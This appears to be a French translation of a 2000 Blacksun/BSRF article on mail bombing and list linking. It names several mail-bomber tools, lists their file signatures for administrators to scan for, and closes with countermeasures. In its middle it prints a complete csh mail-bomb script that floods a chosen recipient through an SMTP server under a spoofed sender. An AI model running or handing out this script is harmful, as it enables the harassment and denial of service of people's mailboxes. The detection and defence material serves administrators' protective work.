@@ -1,0 +1,186 @@
+=============================
+Mail Bombing et List Linking
+=============================
+Ecrit par Tolda [2000]
+Avec les commentaires et les ajouts de R a v e N.
+Ecrit pour BSRF.
+Site: http://blacksun.box.sk
+Traduit par BAHAK
+
+INFORMATIONS IMPORTANTES
+========================
+	Les auteurs de cet article et BSRF ne pensent pas que le mail-bombing et
+le list linking soient contre la loi, et ne puissent etre promuent ou acceptes 
+par quicquonque. En fait, ceux sont les deux choses les plus stupides 
+que l'on puisse faire sur le net. De telles attaques sont seuleument faites par
+des gamins qui ont trop de temps libre, et qui ne sont pas assez brillants pour 
+etudier des techniques plus sophistiquees.
+
+Connaitre Son Ennemi
+====================
+
+   Up Yours:
+                                                                        
+	Le mail-bomber Up Yours est probablement le plus celebre de tous. Il 
+utilise peu de ressource, est efficace, simple d'utilisation et cache l'adresse
+de l'attaquant. Les options du programme permettent de specifier l'heure du jour
+où il demarre et arrete, et aussi le nombre de messages avec lesquels il va 
+frapper la victime.
+
+	Ce mail-bomber marche uniquement sur Microsoft Windows. Si vous etes 
+un administrateur systeme, vous devriez scanner vos disques durs locaux pour chercher
+les fichiers suivants:
+
+upyours.exe
+upyours2.zip
+upyours3.zip
+
+	Si ces fichiers apparaissent dans le repertoire d'un utilisateur, il y a une forte
+probabilite qu'il mail-bombe quelqu'un (il se peut aussi, qu'il recherche simplement a 
+collecter des programmes de hacking et de cracking). Dans tous les cas, l'utiliter est
+difficilement justifiable. Si l'un de vos utilisateurs a ce programme, c'est qu'il s'interesse
+clairement au hacking et au cracking :o)
+
+   KaBoom:
+	
+	KaBoom differe vraiment de Up Yours. Dans ce programme vous constatez l'utilite
+du list link. En utilisant cette fonction, vous pouvez inscrire votre cible a des milliers de
+listes e-mail. Quand je dis qu'une cible a ete liste-linke, je veux dire qu'elle a souscrit
+(sans son consentement) a une ou plusieurs listes e-mail. De tels outils soumettent la demande
+d'enregistrement de la part de la victime, en utilisant leur e-mail.Les fichiers signatures 
+de ce programme sont:
+
+kaboom!3.zip
+kaboom3.exe
+
+   Avalanche:
+
+	Le mail-bomber Avalanche marche bien et possede une belle interface graphique. Les 
+list groups sont affichees dans une boite a menu déroulant, et leurs individual lists sont 
+affichees dans un menu. Trois cliques de souris, et votre cible tombe dans l'eau chaude.
+
+Astuce: Le programmeur a ete, ici, un peu distrait. Le programme etait, au moins en partie, 
+ecrit en Microsoft Visual Basic 4.0. De ce fait, il y a une serie de fichiers Dll qui est 
+requise pour utiliser cette application. Elles ne sont pas fournies dans la distribution du
+programme; donc, de nombreux bombers (attaquants) ont du chercher ailleurs sur internet pour
+obtenir ces fichiers (l'un d'eux est OC2.DLL). A cause de cela, je vais considerer qu'Avalanche 
+est probablement moins utilise que ces homologues, bien que sa conception graphique soit superieure.
+Ces inconvenients decouragent la plupart des utilisateurs de ce genre particulier.Les fichiers 
+signatures de ce programme sont:
+
+alanch10.zip
+avalanche20.zip
+avalanche.exe
+
+   Unabomber:
+
+	Le soft Unabomber est un outil rudimentaire, mais il faut donner du credit a son auteur. Unabomber
+ n'offre pas de possibilite de list-linking. C'est essentiellement un mail-bomber plat, qui ne fait rien
+d'autre que d'envoyer des messages. Toutefois, un element interessant, est le fait que Unabomber soit 
+livrer avec une fonction d'aide. Les fichiers signatures de ce programme sont:
+ 
+unabomb.zip
+unabomb.exe
+ 
+   eXtre Mail:
+
+	eXtreme Mail est un bon programme. Il inclut une installation interactive qui execute tous les 
+controles ordinaires, tels que la verefication espace disque disponnible, ressources et ainsi de suite.
+Il surveille aussi l'enregistrement dans la base de registre, et se desinstalle facilement.
+Les fichiers signatures de ce programme sont:
+
+xmailb1.zip
+xmailb1.exe
+ 
+   Homicide:
+
+	Le programme Homicide a ete ecrit par un jeune au surnom de Frys et a ete stoppe en 1996.
+L'auteur pretend qu'il a ecrit le programme car Up Yours 2.0 n'etait pas adequate comme mail-bomber.
+Toutefois, avec la version 3.0 de Up Yours, Frys a apparement decider d'abandonner d'autres versions.
+Il est difficilement trouvable, a part sur des sites tres selectionnes. Les fichiers signatures de ce 
+programme sont:
+ 
+homicide.zip
+homicide.exe
+ 
+   The UNIX MailBomb:
+
+	Ce mail-bomber UNIX est normalement attribue a CyberGoat, un crackeur anonyme du neant.
+Le fichier signature de celui-ci est:
+mailbomb.csh.
+C'est en fait un CSH shell script et pas un programme, depuis qu'Unix a de tels capacite de shells et 
+shell scripting. Son principal avantage est qu'il est de tres petite taille.
+
+ #!/bin/csh
+ # Anonymous Mailbomber
+ # do chmod u+rwx <filename> where filename is the name of the file 
+ that
+ # you saved it as.
+ #*** WARNING - THIS WILL CREATE AND DELETE A TEMP FILE CALLED
+ # "teltemp"
+ # IN THE DIRECTORY IT IS RUN FROM ****
+ clear
+ echo -n "What is the name or address of the smtp server ?"
+ set server = $<
+ #echo open $server 25 > teltemp
+ echo quote helo somewhere.com >> teltemp
+ #The entry for the following should be a single name (goober),
+ #not goober@internet.address <mailto:goober@internet.address>.
+ echo -n "Who will this be from (e.g. somebody) ?"
+ set from = $<
+ echo quote mail from: $from >> teltemp
+ echo -n "Who is the lucky recipient (e.g. someone@somewhere) ? "
+ set name = $<
+ echo quote rcpt to: $name >> teltemp
+ echo quote data >> teltemp
+ echo quote . >> teltemp
+ echo quote quit >> teltemp
+ echo quit >> teltemp
+ echo -n "How many times should it be sent ?"
+ set amount = $<
+ set loop_count = 1
+ while ($loop_count <= $amount)
+ echo "Done $loop_count"
+ ftp -n $server 25 < teltemp
+ @ loop_count++
+ end
+ rm ./teltemp
+ echo $amount e-mails complete to $name from $from@$server
+ # --------------------
+ # MailBomb by CyBerGoAT
+
+   Bombtrack:
+
+	Le programme Bombtrack est normalement recense comme le premier mail-bomber ecrit pour
+le systeme d'exploitation Macintosh. C'est un autre programme de mail-bombing parmi les autres.
+Il est largement disponnible a travers le web sur les sites des crackeurs. Le fichier signature
+de ce programme est:
+
+bombtrack.bin
+
+   FlameThrower:
+
+	FlameThrower est un mail-bomber destine a Macintosh. Sa fonction principale est le list-linking;
+il autorise l'utilisateur a souscrire sa cible a 100 lists. La taille du fichier binaire es assez grande,
+si l'on considere ce qu'il propose. Le fichier signature de ce programme est:
+
+flamethrower10b.sit.bin
+ 
+
+
+   Mesures Anti-Mail Bombing
+   =========================
+
+	Il y a beaucoup de programmes (comme pop3free, pop3clean, etc') qui nettoieront vos comptes e-mail 
+pop3. Pour en savoir plus sur le Pop3, referez vous au tutorial BSRF.
+Quant aux boites e-mail du web (hotmail, yahoo,etc'), vous pouvez toujours sauver les vrais e-mails que
+vous avez et effacer tous le reste (toutes les boites e-mails sur le web ont cette possibilite).
+Pour rendre compte de telles attaques, enoyez un message a l'equipe d'abus (par exemple si vous avez un 
+compte a hotmail.com, envoez votre e-mail a abuse@hotmail.com).
+
+	Quant au list linking, si vous faites face a une grande attaque, et que vous ne pouvez vous 
+desabonner de toutes les mailings lists par vous meme, considerer le fait de changer de compte.
+Desole, il n'y a pas d'autre solution.
+
+Ecrit par Tolda [2000]
+traduit par Bahak [2001]
